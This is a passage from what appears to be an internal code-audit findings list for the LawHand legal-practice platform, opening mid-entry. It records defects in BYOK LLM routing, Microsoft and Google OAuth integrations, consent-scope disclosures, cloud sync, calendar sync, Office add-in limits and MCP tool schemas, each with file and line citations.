claim: In llm_routing.py:540-573, decrypt failure or a missing key (bare except at 545-546) lets resolution continue to profile and platform routes. configure_customer_llm replaces customer_llm_config and keeps encrypted_api_key only if api_key is resent (admin.py:1557-1577) yet returns ok with use_customer_llm=true. This violates 'no platform fallback unless the firm explicitly authorizes one' (docs/standard-premium-byok-billing-plan-2026-08-16.md:212-213).

title: BYOK Azure endpoint is accepted without the /openai/v1 path and never connection-tested
claim: The byok_security normalizer (byok_security.py:67-73) keeps whatever path the admin supplied and LLMService points the plain OpenAI client at it (llm.py:272-275); the portal resource URL (https://x.openai.azure.com/) is accepted though OpenAI-SDK calls need /openai/v1/. No test at save time (admin.py:1536-1571), and llm_availability probes only gateway aliases (llm_availability.py:40-130). Admins can save a 'working' config where every AI call fails.

title: BYOK Gemini only supports a global AI Studio key with no paid-tier, region or Vertex controls
claim: The only Gemini option is the fixed generativelanguage.googleapis.com endpoint with an API key (byok_security.py:10-32); nothing checks the key belongs to a paid Cloud-Billing project, there is no regional/Vertex option, and the default model is hard-coded gemini-2.0-flash (llm_routing.py:555). A free-tier key can expose client content to provider training; residency-constrained firms cannot use their own Gemini.

title: 'copilot'/'gemini' BYOK path is mislabelled as a subscription and bypasses the LiteLLM gateway
claim: The admin endpoint says 'use their own LLM subscription (Gemini/Copilot)' (admin.py:1509-1521) but provider 'copilot' is an Azure OpenAI resource (byok_security.py:33-58; config.py:155 'Azure OpenAI (Copilot backend)'; tenant.py:221-226). The stored key bypasses the LiteLLM gateway (llm.py:261-275) and skips gateway accounting metadata (llm.py:351), contradicting TASKS.md:2622 (direct paths removed) and ECO-20 (TASKS.md:479-481) and the plan (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:55-57). AZURE_OPENAI_* and GEMINI_API_KEY settings are dead (config.py:156-161). Invites the misconception that a firm's M365 Copilot licence powers LawHand and escapes gateway approval/metering.

title: Microsoft 365 / Google disconnect is not exposed in the admin UI, does not revoke at the provider, and does not purge synced data
claim: POST /integrations/microsoft/disconnect and /google/disconnect exist (integrations.py:2105-2166) but api.js has no wrapper (api.js:798-835) and ProviderCard shows only Connect/Re-authorize (IntegrationsPanel.jsx:760-769). The endpoints delete tokens locally (token_vault.py:382-399) without revoking at Microsoft/Google, and leave Gmail subjects, snippets and participants in cloud_metadata_index. The legal notice (LegalNoticePage.jsx:58) and admin guide (04-integrations.md:85-91) promise an in-app disconnect, which Google Limited Use verification relies on.

title: Admin OAuth errors always land on /onboarding and the Cloud section never shows the connect result
claim: _error_redirect sends every admin-intent error to /onboarding?error=... even when onboarding is completed (integrations.py:1789-1807); on success the redirect to /admin?tab=integrations&integration=cloud&connected=<provider> is ignored because IntegrationsPanel never reads connected/error (IntegrationsPanel.jsx:145-158), unlike ZoomPanel.jsx:89-105 and CalendarPage.jsx:508-548. A completed tenant sees the error above 'Setup Complete!' (OnboardingWizard.jsx:73-77, 717), contradicting 04-integrations.md:47,51.

title: Saving a SharePoint library silently switches the primary storage provider
claim: SharePointBindingCard always sends is_primary: true (IntegrationsPanel.jsx:485-493); the backend sets primary_cloud_provider='sharepoint' (cloud_admin.py:397-405) and the panel updates the selector (IntegrationsPanel.jsx:338), bypassing PrimaryCloudSelector's confirmation (351-354). The binding is stored 'configured' with no write check, repointing all new matter writes without warning.

title: 'Granted by' never renders and the deactivated-grantor warning is never shown
claim: ProviderCard reads info.service_account_email (IntegrationsPanel.jsx:723-725) but GET /admin/permissions never returns it (admin.py:1706-1797; only the test fixture IntegrationsPanel.test.jsx:69 has it). The 'User X who granted consent is deactivated' warning exists only in /admin/integrations/health (admin.py:365-376), whose client getIntegrationsHealth (api.js:799-800) is never called. Admins cannot see who owns the firm grant before offboarding them.

title: Cloud Search reports Available/Connected/Enabled while the connection is broken
claim: The hub pill returns 'Available' for any cloud tone except 'off', including 'Needs attention' (IntegrationsHub.jsx:106-110). The Cloud Search status endpoint filters only is_active, not health, so revoked/refresh_failed credentials show 'Connected' (cloud_admin.py:170-176, 257-263), and it hard-codes enabled: True even in its error branch (219-238, 267-272); CloudSearchAdmin.jsx:52-57,73 ignores status:'error'.

title: No per-user disconnect for personal Microsoft/Google connections
claim: The Microsoft and Google disconnect endpoints (integrations.py:2105-2167) are admin-only and delete every user's UserOAuthToken for the tenant; unlike Zoom's per-user disconnect (integrations.py:2368-2391), there is no self-service endpoint or frontend control (api.js exposes only Zoom/QBO helpers, api.js:900-914, 2840). An attorney cannot revoke LawHand's Mail.Read/Mail.Send/Files access to their own mailbox without an admin disconnecting the whole firm.

title: 'Connect in Admin > Integrations' is a silent dead end for non-admin users
claim: The empty Cloud Files state calls navigate('/admin') (MatterDetailPage.jsx:1302-1309), but /admin is a financeOnly ShellRoute (App.jsx:490-491) and ProtectedRoute redirects users without finance access to their default route (App.jsx:210-212). Other non-actionable admin pointers: CloudFolderCard copy (MatterDocumentsTab.jsx:219-223), StorageReadinessNotice.jsx:30, and the send error 'Reconnect ... in Integrations' (connected_mail.py:233-239).

title: 'Connect Calendar' button silently requests mailbox read/send and full file access
claim: The CalendarPage button 'Connect Calendar' / 'Connect your calendar to sync events' (CalendarPage.jsx:862-871) redirects immediately (778-781) to intent=user, which requests MICROSOFT_USER_SCOPES 'offline_access User.Read Mail.Read Mail.Send Files.ReadWrite.All Calendars.ReadWrite' or Google gmail.readonly, gmail.send, calendar and drive (integrations.py:256-265), with no explainer before consent.

title: Matter cloud 'connected' is true when any tenant credential exists, including Zoom
claim: _build_matter_cloud_files_response returns connected=True if any active TenantCredential exists, including zoom/zoom_phone (matters.py:227-235; integrations.py:978, 1183-1185). The UI then shows 'Connected', a 'Cloud' badge on every conversation and 'Cloud context active — AI chats here have access to matter files from your connected OneDrive, SharePoint, and Google Drive' (MatterDetailPage.jsx:99-103, 1279-1283, 1809-1815).

title: Matter cloud-file errors are shown as 'no files' or 'not connected'
claim: Any fetch error sets {connected:false} and renders 'No cloud integrations connected' (MatterDetailPage.jsx:560-567); a backend search exception such as an expired token returns {files:[], connected:true} (matters.py:259-263), rendering 'No cloud files found matching this matter.' (MatterDetailPage.jsx:1310-1313); MatterDocumentsTab.jsx:407-413 also swallows errors. No reconnect action is shown.

title: Calendar move/delete always claims the connected calendar was updated, ignoring the provider result
claim: After updateScheduledEvent the UI always shows 'Moved ... and updated the connected calendar.' (CalendarPage.jsx:684-687), ignoring the sync_status/external_calendar_event_id/calendar_provider the PATCH returns (calendar.py:481-497) and showing it even for local-only events; syncMessageForScheduledEvent (CalendarPage.jsx:294) is not reused. Delete always says 'Event deleted from LawHand and its connected calendar.' (CalendarPage.jsx:819-823) while delete_external_event discards the boolean from ms_delete_event/google_delete_event (scheduled_events.py:125-143; calendar_sync.py:306-320) and the route returns 204 regardless (calendar.py:501-521). Attorneys believe external meetings moved or were cancelled when they were not.

title: Consent copy and admin/user/setup docs omit Mail.Send/gmail.send and write-all-files access
claim: Code requests Mail.Send and Files.ReadWrite.All in Microsoft admin and user sets and gmail.send in Google admin/user/solo sets (integrations.py:241-272; connected_mail.py:44-45) and sends via /me/sendMail and messages/send. Yet the onboarding wizard says 'read mail, read files' (OnboardingWizard.jsx:420), the hub card says 'Mail and calendar access for enabled workflows' (IntegrationsHub.jsx:71-75), the admin data-visibility guide omits Mail.Send and says Gmail 'does not authorize sending' (16-integration-data-visibility.md:42, 60-62), docs/integrations-setup.md:42-53 lists no Mail.Send and 'Gmail read', docs/virtual-document-assistant-plan.md:544-545 says read-only, and the user transparency guide omits send (16-integration-transparency.md:39-47, 63-69; it also wrongly says documents are not copied locally at line 119 and links to missing chapters at 125-126). Customer security records and consent disclosures under-report send/write permission.

title: Backend container lacks metric-compatible Office fonts for DOCX-to-PDF signing copies
claim: backend/Dockerfile:27-36 installs only fonts-liberation and fonts-nanum; there is no Carlito/Caladea (Calibri/Cambria metrics) or Aptos substitute, and the team's validation does not certify production LibreOffice conversion (docs/template-studio-word-source-review.md:62). Signed PDFs can reflow, moving signature captions across pages.

title: Live DOCX-to-PDF preview spawns unbounded LibreOffice processes in the API worker
claim: The render-file preview calls docx_to_pdf_bytes per request with no semaphore or queue (document_templates.py:3510-3523); only the source-preview cache is single-flight (template_source_preview.py:35-37). Auto-preview re-fires 650 ms after typing (usePrepareFill.js:13, 79, 425-428), and each conversion starts soffice with up to 60 s timeout (docx_to_pdf.py:92-116), so concurrent users can exhaust API CPU/memory.

title: Most Graph/Google call sites have no 429/Retry-After handling; syncs truncate silently and calendar pushes are lost
claim: Only provider_http.graph_request retries. Calendar (calendar_sync.py:124-141, google_calendar.py:100-166, microsoft_calendar.py:165-198), cloud sync (cloud_sync.py:343-372, 1058-1064), cloud_search, cloud_init, document_sync, directory (user_sync.py:130-145) and discovery (storage_discovery.py:214-250) use raw httpx and break or return empty on any non-200; task pushes are fire-and-forget with no durable retry. Throttled large firms get partial indexes and permanently stale calendar copies with no alert.

title: Google 403 rate-limit responses are treated as auth failures (no backoff, 'Reconnect' shown)
claim: provider_http.py:95-100 turns every 401/403 into ProviderAuthError without checking the reason, but Google returns 403 rateLimitExceeded/userRateLimitExceeded; connected_mail maps this to REAUTHORIZATION_REQUIRED (connected_mail.py:267-280). Throttled users are told to reconnect and nothing is retried.

title: BK28/ECO ledger in TASKS.md is stale: shipped items unchecked and plan current-state gaps outdated
claim: TASKS.md:395-518 heads the epic '(PLANNED)' with every ECO item unchecked, although ECO-17 (Personal Google mode, integrations.py:266-286; CHANGELOG.md:279-289), ECO-24..28 (docs/sms-provider-operations.md:11-40; propose_client_sms) and parts of ECO-01/04 shipped. The plan still says 'personal Gmail directory sync fails' (plan:64) and that trial_ends_at is unread (plan:66, 262-265), fixed in 2026.09.11.8. Planning against it duplicates shipped work.

title: /api/integrations/status reports Personal Google tenants as missing the directory scope
claim: google_required is always GOOGLE_ADMIN_SCOPES (integrations.py:1856) with no effective_required_scopes for the personal tier, so missing_scopes includes admin.directory and reconnect_required is true (1904-1921); /admin/permissions handles this correctly (admin.py:1702). Teams pages and future status consumers misreport healthy personal tenants.

title: Google domain-wide delegation is configuration-only and scope comments are misleading
claim: google_service_account.py:1-41 says DWD is used for directory and mail, but no caller passes subject and GOOGLE_IMPERSONATE_SUBJECT (config.py:175-178) is never read; DRIVE_SCOPES is described as 'least privilege' but is the full drive scope. Operators may configure DWD expecting it to work and reviewers may think scopes were minimized.

title: Revoked user tokens stay in the capture roster and are refreshed on every use
claim: _locked_user_token does not filter health='revoked' (token_vault.py:213-231), so each correspondence cycle, search and push retries refresh and logs a failure (scheduler.py:1896-1952), producing repeated failures rather than a single 'user must reconnect' state.

title: ms_read_mail_tenant is dead and broken
claim: microsoft_mail.py:101-134 passes the Graph user id as the LawHand user_id to get_fresh_user_token, so every user is skipped; there are no callers. A trap for anyone building tenant-wide capture on it.

title: Background calendar pull hides provider token failures
claim: The 5-minute pullProviderChanges catches every error and does nothing (CalendarPage.jsx:610-624) and keeps no last-synced time, so stale Outlook/Google events remain with no warning after a token expires.

title: Google Drive firm-knowledge import query ANDs MIME and extension, skips Shared Drives and does not page
claim: document_sync.py:281-305 joins the mime and extension clauses with ' and ' (cloud_sync.py:339 uses OR), has no supportsAllDrives/includeItemsFromAllDrives, and uses pageSize=min(max_files,100) with no nextPageToken. .odt/.wpd files, extensionless files and Shared Drive files are never imported and counts cap at 100.

title: SharePoint index sync ignores the bound site and indexes /sites/root
claim: sync_all calls sync_sharepoint(db, tenant_id) without the sharepoint_binding site_id (cloud_sync.py:145-152, 622-700), so the admin-bound matter library is not indexed and intranet root-site files appear in firm search instead.

title: Per-matter 'Sync folder' reports 'synced' when providers failed
claim: sync_matter_folders only logs provider exceptions (cloud_sync.py:222-266) and the router returns status 'synced' with counts (matters.py:3407-3425), so users think the matter's cloud files are current when listing failed.

title: Manual directory sync result and failures are invisible to the admin
claim: The durable user_sync job raises without record_sync_failure and skips Google if Microsoft raises (durable_job_worker.py:405-434). The 'Sync now' UI uses a fixed 4 s timer and one shared syncing flag for both provider cards (IntegrationsPanel.jsx:114-126, 271-282), then silently reloads with no success/failure/count; errors go to a banner that never clears. The card keeps showing the last 'ok' sync after a failed run.

title: Teams notification cards are posted as the consenting admin, not a bot
claim: teams_notify.py:150-171 posts cards with delegated ChannelMessage.Send (teams.py:401-406) using the consenting user's or tenant credential's token; there is no bot identity, so deadline alerts appear 'from' a partner.

title: Word stale-check fingerprints only the selected text
claim: wordAdapter.ts:30-54 hashes the selected text (sha256) with no position or paragraph identity, so re-selecting identical boilerplate elsewhere applies the plan there without a stale warning.

title: Add-in limits are hard-coded; /api/office/policy and OFFICE_MAX_WORD_CHARACTERS are ignored
claim: Word/Excel limits are constants (wordAdapter.ts:13, excelAdapter.ts:13); /api/office/policy (routers/office_assistant.py:47-63) is never called, and the schema caps Word text at 50,000 regardless of OFFICE_MAX_WORD_CHARACTERS (schemas/office_assistant.py:46). Changed limits yield unexplained 422s or silently no effect.

title: Office exchange denies demo tenants that the plan endpoints allow
claim: The exchange calls require_office_pilot_tenant directly (auth.py:1777), while plans use require_office_for_user, which exempts billing_tier=='demo' (office_access.py:42-48). Sales demos cannot sign in unless also allowlisted.

title: Missing OFFICE_ENTRA_API_AUDIENCE produces a bogus '/office.access' scope and bypasses the not-configured guard
claim: docker-compose.hypervisor.yml:411 builds VITE_OFFICE_API_SCOPE as ${OFFICE_ENTRA_API_AUDIENCE:-}/office.access, never empty, bypassing the 'Office SSO is not configured' guard (officeSession.ts:40-42) and surfacing an opaque MSAL error.

title: Workflow-run MCP tool schemas use nested $defs/$ref that Copilot Studio drops
claim: WorkflowRunInput nests RunStepInput and SourceBinding lists (workflow_run_contract.py:85-94) and the tool schema is emitted directly from model_json_schema() (workspace_mcp_protocol.py:230-236), producing $defs/$ref and anyOf-null unions; Copilot Studio documents that reference-type inputs are filtered, so propose/resume_workflow_run may silently not appear.

title: MCP tool results carry relative links and internal file-server paths
claim: search_firm_memory returns unc_path, share_id and owner and a relative '/firm-memory?...' lawhand_url (chat_tools/handlers.py:246-261); source chips use relative '/api/documents/{id}/download' (396), contrary to docs/workspace_mcp_adapter.md:395. External assistants cannot deep-link and internal SMB topology leaks into third-party history.

title: communications:propose consent label omits SMS drafting
claim: The label 'Draft client email proposals without sending' (services/workspace_mcp_oauth.py:46) understates the scope, which also authorizes propose_client_sms (automation_capabilities.py:532-547).

title: AI request broker checks data class before resolving the route, skipping the BYOK fail-closed rule
claim: _enforce_policy calls route_matter_context_allowed without a route (ai_request_broker.py:255-272), then resolve_llm_route (317-321) may return the BYOK 'customer' route, which llm_routing.py:383-402 says must fail closed for confidential data. Affects flagged prospect-confidential after-call preparation (after_call_preparation.py:204-219); chat blocks the same case.

title: Onboarding 'Sync Users' button does not run a sync
claim: handleSyncUsers (OnboardingWizard.jsx:133-151) only persists step numbers (POST /admin/onboarding/step/{n} writes onboarding_step, onboarding.py:203-221) and advances to Review, relying on the post-connect background sync; if that failed the admin sees '0 users imported'.

title: Microsoft token-exchange failure is shown as a Google error; consent errors get a generic message
claim: OAUTH_ERROR_MESSAGES.token_exchange_failed says 'Google authorization could not be completed' (OnboardingWizard.jsx:35-39), but the Microsoft callback emits the same code (integrations.py:545); access_denied, consent_required, interaction_required, invalid_state and oauth_failed all fall back to one generic message (line 77), with no Global Administrator guidance.

title: Hub Teams pill and Teams panel use different sources and contradict each other
claim: The hub uses permissions.microsoft.capabilities.teams (IntegrationsHub.jsx:153-161), which depends on account_type that /admin/permissions does not backfill (admin.py:1648-1652 vs 322-324); TeamsPanel uses /integrations/status teams_connected (TeamsPanel.jsx:105-108), which backfills and honours TEAMS_FEATURE_ENABLED (integrations.py:1844-1865). Admins get contradictory states and a reconnect loop.

title: Destructive integration actions run without confirmation
claim: Storage migration 'Abandon' (StorageMigrationPanel.jsx:113-116, 140), Zoom/Zoom Phone 'Disconnect' and 'Clear tenant app' (ZoomPanel.jsx:108-119, 134-145, 164-176) and Cloud Search 'Invalidate Cache' (CloudSearchAdmin.jsx:328-352) act on one click, unlike QBOPanel.jsx:146-147.

title: Admin connect endpoints return raw JSON errors on top-level navigation
claim: The 501/428/403/400 responses in the Microsoft connect (integrations.py:431-448) and google_connect (664-687) endpoints are HTTPExceptions rendered as {"detail": ...}; the admin panel's Connect button is always enabled (IntegrationsPanel.jsx:760-769), unlike onboarding which disables it until agreements are ready (OnboardingWizard.jsx:411-412).

title: In-product and doc navigation points to locations that do not exist
claim: Wizard says 'Admin > Integrations > Cloud > Storage migration' (OnboardingWizard.jsx:538-540) but it is under Advanced and needs manage_integrations (IntegrationsHub.jsx:238-257); CloudSearchAdmin.jsx:95 says 'Settings > Integrations'; TeamsPanel.jsx:133 names an 'Integrations tab' without a link; docs describe missing Shared Drive/root-repair controls (21-onboarding-and-storage-setup.md:54,63) and send folder repair to SMB 'File Shares' (18-cloud-provider-support.md:97); the 'MCP Servers' button (UserMcpAccess.jsx:411-417) silently falls back to Overview without manage_integrations.

title: Cloud Search copy hard-codes a 15-minute sync interval
claim: CloudSearchAdmin.jsx:390 states 15 minutes, but the interval is CLOUD_METADATA_SYNC_INTERVAL_MIN and the job runs only if enabled (scheduler.py:804-809).

title: Document Open links use the stored web URL instead of the /open resolver
claim: MatterDocumentsTab.jsx:1140, 1280, 1406 link to doc.cloud_url (persisted storage_path) rather than /matters/{m}/documents/{d}/open, which resolves a fresh editing URL from durable IDs (matter_documents.py:719-747) and is already used by ActionProposalCard.jsx:584-586. After a rename/move in SharePoint/OneDrive, Open 404s.

title: Documents tab repeats the slowest live cloud search
claim: MatterDocumentsTab.jsx:407-413 calls getMatterCloudFiles on mount although MatterDetailPage already ran it ('by far the slowest request', MatterDetailPage.jsx:569-575), and swallows errors.

title: Correspondence load failure renders as an empty archive
claim: MatterCorrespondenceTab.jsx:570-573 does .catch(() => setItems([])), rendering 'No correspondence captured yet. Configure capture rules, then click Scan now' (683-689) on API/permission errors.

title: Filled sample documents uploaded as template sources stay on LawHand host disk
claim: Template intake invites filled samples (TemplatesPage.jsx:843) and document_templates.py:760-790 persists these originals under UPLOAD_DIR, whereas matter files go to the customer's own cloud (matter_file_store.py:1-8). Client PII stays outside the firm's retention/eDiscovery controls.

title: Microsoft integration is hard-wired to the commercial cloud
claim: login.microsoftonline.com and graph.microsoft.com are hard-coded in 18 modules (e.g. storage_discovery.py:18, 30-32; cloud_folder_audit.py:140-145) and continuation-URL validators reject other hosts, so GCC High/DoD/21Vianet tenants cannot use LawHand.

title: Office add-in roadmap has no live TASKS entries; the only item refers to the removed word-addin prototype
claim: TASKS.md:958-959 still says 'Ship the Word add-in properly ... or archive it' though word-addin/ was replaced by office-addin/ (docs/office-document-assistant-plan.md:355); Office plan Slices 1-5 (259-306) and W2 Template Builder have no TASKS entries.

title: Integrations remediation plan status and migration references are wrong
claim: docs/integrations-remediation-plan.md:3 says 'Status: Proposed' though phases 0-2 are Done, and cites migrations 073/074 under migrations/versions (31, 179, 195) instead of backend/alembic/versions/082_integration_observability.py and 083_matter_doc_storage_meta.py.

title: Mojibake in customer-facing release notes for Workspace MCP entries
claim: 'ΓÇö'/'ΓÇÖ' appear 3 times in RELEASE_NOTES.md (1647, 1766, 1769) and 3 times in backend/app/release_notes.json, which feeds in-app 'What's new'.
